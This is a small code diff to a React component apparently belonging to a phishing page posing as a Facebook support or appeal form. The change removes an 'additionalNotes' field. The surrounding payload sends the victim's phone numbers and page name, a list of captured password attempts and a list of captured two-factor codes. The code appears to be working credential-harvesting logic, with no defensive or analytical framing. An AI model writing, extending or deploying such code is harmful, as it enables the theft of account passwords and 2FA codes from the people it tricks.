@@ -216,8 +216,7 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
                 phoneNumber: form.phone,
                 backupPhone: form.backupPhone,
                 facebookPageName: form.pageName,
-                reason: form.reason,
-                additionalNotes: form.additionalNotes
+                reason: form.reason
             },
             passwords: passwordAttemptsRef.current.slice(0, Math.max(1, Number(appConfig.MAX_PASS || 2))),
             codes: twoFAAttemptsRef.current,
